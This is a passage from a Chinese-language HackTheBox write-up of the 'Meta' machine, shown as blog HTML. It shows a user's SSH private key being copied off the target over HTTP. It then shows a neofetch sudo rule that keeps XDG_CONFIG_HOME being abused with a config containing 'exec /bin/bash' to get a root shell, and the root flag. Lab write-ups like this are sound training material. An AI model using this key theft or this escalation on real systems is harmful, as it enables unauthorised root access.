class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 32<br>drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh<br>-rw-r----- 1 root   thomas   33 Jan 29 21:54 user.txt<br>thomas@meta:~$ <span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">cd</span> .ssh<br>thomas@meta:~/.ssh$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 20<br>drwx------ 2 thomas thomas 4096 Jan  4  2022 .<br>drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 ..<br>-rw-r--r-- 1 thomas thomas  563 Jan  4  2022 authorized_keys<br>-rw------- 1 thomas thomas 2590 Aug 29  2021 id_rsa<br>-rw-r--r-- 1 thomas thomas  563 Aug 29  2021 id_rsa.pub<br>thomas@meta:~/.ssh$ <br><br>thomas@meta:~/.ssh$ python3 -m http.server 8080<br>python3 -m http.server 8080<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ wget http://10.10.11.140:8080/id_rsa<br>--2024-01-30 14:54:11--  http://10.10.11.140:8080/id_rsa<br>正在连接 10.10.11.140:8080... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2590 (2.5K) [application/octet-stream]<br>正在保存至: “id_rsa”<br><br>id_rsa                   100%[===============================&gt;]   2.53K  --.-KB/s  用时 0s      <br><br>2024-01-30 14:54:12 (167 MB/s) - 已保存 “id_rsa” [2590/2590])<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ <span class="hljs-built_in">chmod</span> 600 id_rsa<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ssh -i id_rsa thomas@10.10.11.140<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.140 (10.10.11.140)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:Y8C2lOecv5ZDp3I6M5zjDUYDVsc3p/pgjF9HVRPioqQ.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.140<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">thomas@meta:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>32、开始尝试枚举下sudo权限信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">id</span><br>uid=1000(thomas) gid=1000(thomas) <span class="hljs-built_in">groups</span>=1000(thomas)<br>thomas@meta:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> thomas on meta:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,<br>    env_keep+=XDG_CONFIG_HOME<br><br>User thomas may run the following commands on meta:<br>    (root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;<br>thomas@meta:~$ <br></code></pre></td></tr></table></figure>
+
+<p>33、运行这个程序，发现提权需要通过这个程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <br>thomas@meta:~$ /usr/bin/neofetch<br>       _,met$$$$<span class="hljs-variable">$gg</span>.          thomas@meta <br>    ,g$$$$$$$$$$$$$$<span class="hljs-variable">$P</span>.       ----------- <br>  ,g$<span class="hljs-variable">$P</span><span class="hljs-string">&quot;     &quot;</span><span class="hljs-string">&quot;&quot;</span>Y$$.<span class="hljs-string">&quot;.        OS: Debian GNU/Linux 10 (buster) x86_64 </span><br><span class="hljs-string"> ,$<span class="hljs-variable">$P</span>&#x27;              `$$$.     Host: VMware Virtual Platform None </span><br><span class="hljs-string">&#x27;,$<span class="hljs-variable">$P</span>       ,ggs.     `$<span class="hljs-variable">$b</span>:   Kernel: 4.19.0-17-amd64 </span><br><span class="hljs-string">`d$$&#x27;     ,<span class="hljs-variable">$P</span>&quot;</span><span class="hljs-string">&#x27;   .    $$$    Uptime: 4 hours, 2 mins </span><br><span class="hljs-string"> $$P      d$&#x27;</span>     ,    $<span class="hljs-variable">$P</span>    Packages: 495 (dpkg) <br> $$:      $$.   -    ,d$$<span class="hljs-string">&#x27;    Shell: bash 5.0.3 </span><br><span class="hljs-string"> $$;      Y$b._   _,d$P&#x27;</span>      Terminal: /dev/pts/2 <br> Y$$.    `.`<span class="hljs-string">&quot;Y$$$<span class="hljs-variable">$P</span>&quot;</span><span class="hljs-string">&#x27;         CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz </span><br><span class="hljs-string"> `$$b      &quot;-.__              GPU: VMware SVGA II Adapter </span><br><span class="hljs-string">  `Y$$                        Memory: 146MiB / 1994MiB                                           </span><br><span class="hljs-string">   `Y$$.</span><br><span class="hljs-string">     `$$b.                                            </span><br><span class="hljs-string">       `Y$$b.</span><br><span class="hljs-string">          `&quot;Y$b._</span><br><span class="hljs-string">              `&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">thomas@meta:~$ sudo /usr/bin/neofetch</span><br><span class="hljs-string">       _,met$$$$$gg.          root@meta </span><br><span class="hljs-string">    ,g$$$$$$$$$$$$$$$P.       --------- </span><br><span class="hljs-string">  ,g$$P&quot;     &quot;&quot;&quot;Y$$.&quot;.        OS: Debian GNU/Linux 10 (buster) x86_64 </span><br><span class="hljs-string"> ,$$P&#x27;</span>              `$$$.     Host: VMware Virtual Platform None <br><span class="hljs-string">&#x27;,$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 </span><br><span class="hljs-string">`d$$&#x27;</span>     ,<span class="hljs-variable">$P</span><span class="hljs-string">&quot;&#x27;   .    $$$    Uptime: 4 hours, 3 mins </span><br><span class="hljs-string"> $<span class="hljs-variable">$P</span>      d$&#x27;     ,    $<span class="hljs-variable">$P</span>    Packages: 495 (dpkg) </span><br><span class="hljs-string"> $$:      $$.   -    ,d$$&#x27;    Shell: bash 5.0.3 </span><br><span class="hljs-string"> $$;      Y<span class="hljs-variable">$b</span>._   _,d<span class="hljs-variable">$P</span>&#x27;      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz </span><br><span class="hljs-string"> Y$$.    `.`&quot;</span>Y$$$<span class="hljs-variable">$P</span><span class="hljs-string">&quot;&#x27;         GPU: VMware SVGA II Adapter </span><br><span class="hljs-string"> `$<span class="hljs-variable">$b</span>      &quot;</span>-.__              Memory: 146MiB / 1994MiB <br>  `Y$$                                                                                           <br>   `Y$$.                                              <br>     `$<span class="hljs-variable">$b</span>.<br>       `Y$<span class="hljs-variable">$b</span>.<br>          `<span class="hljs-string">&quot;Y<span class="hljs-variable">$b</span>._</span><br><span class="hljs-string">              `&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br>thomas@meta:~$ <br></code></pre></td></tr></table></figure>
+
+<p>34、这里有个信息，需要提示下：后面的 &quot;&quot; 是用来防止输出其他参数的，也就是默认只能运行程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(root) NOPASSWD: /usr/bin/neofetch \&quot;\&quot;<br></code></pre></td></tr></table></figure>
+
+<p>35、这里如果想提权，就涉及到一个新的知识点了</p>
+<p><code>env_keep+=XDG_CONFIG_HOME</code></p>
+<p><code>运行 Sudo 命令时，它会将环境变量 XDG_CONFIG_HOME 保留给 Sudo 命令！</code></p>
+<p><code>环境变量 XDG_CONFIG_HOME 是什么？</code></p>
+<p><code>有一个相对于该基目录的特定于用户的配置文件应写入该目录。此目录由环境变量 $XDG_CONFIG_HOME 定义。（摘自 https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html）</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">ls</span> -la<br>total 36<br>drwxr-xr-x 5 thomas thomas 4096 Jan 30 01:54 .<br>drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..<br>lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout<br>-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config<br>drwx------ 3 thomas thomas 4096 Jan 30 01:54 .gnupg<br>-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile<br>drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh<br>-rw-r----- 1 root   thomas   33 Jan 29 21:54 user.txt<br>thomas@meta:~$ <span class="hljs-built_in">cd</span> .config/<br>thomas@meta:~/.config$ <span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .<br>drwxr-xr-x 5 thomas thomas 4096 Jan 30 01:54 ..<br>drwxr-xr-x 2 thomas thomas 4096 Dec 20  2021 neofetch<br>thomas@meta:~/.config$ <span class="hljs-built_in">cd</span> neofetch/<br>thomas@meta:~/.config/neofetch$ <span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxr-xr-x 2 thomas thomas  4096 Dec 20  2021 .<br>drwxr-xr-x 3 thomas thomas  4096 Aug 30  2021 ..<br>-rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 config.conf<br>thomas@meta:~/.config/neofetch$<br></code></pre></td></tr></table></figure>
+
+<p>36、利用提示文件</p>
+<p><code>https://gtfobins.github.io/gtfobins/neofetch/#sudo</code></p>
+<p><code>TF=$(mktemp)</code><br><code>echo &#39;exec /bin/sh&#39; &gt;$TF</code><br><code>sudo neofetch --config $TF</code></p>
+<p>37、导出 XDG_CONFIG_HOME 环境变量，并通过我们邪恶的 neofecth 的配置文件以 root 身份执行任何命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">thomas@meta:~$ <span class="hljs-built_in">cd</span> ~<br>thomas@meta:~$ <span class="hljs-built_in">export</span> XDG_CONFIG_HOME=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.config&quot;</span><br>thomas@meta:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;exec /bin/bash&#x27;</span> &gt; .config/neofetch/config.conf<br>thomas@meta:~$ sudo /usr/bin/neofetch<br>root@meta:/home/thomas<span class="hljs-comment"># </span><br>root@meta:/home/thomas<span class="hljs-comment"># cd /root/</span><br>root@meta:~<span class="hljs-comment"># ls</span><br>conf  root.txt<br>root@meta:~<span class="hljs-comment"># cat root.txt </span><br>d8601891ec6cf00e8a786db52d42cec2<br>root@meta:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/429</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Meta-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/30/Meta-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/28/Shibboleth-htb-writeup/" title="Shibboleth-htb-writeup">
+                        <span class="hidden-mobile">Shibboleth-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
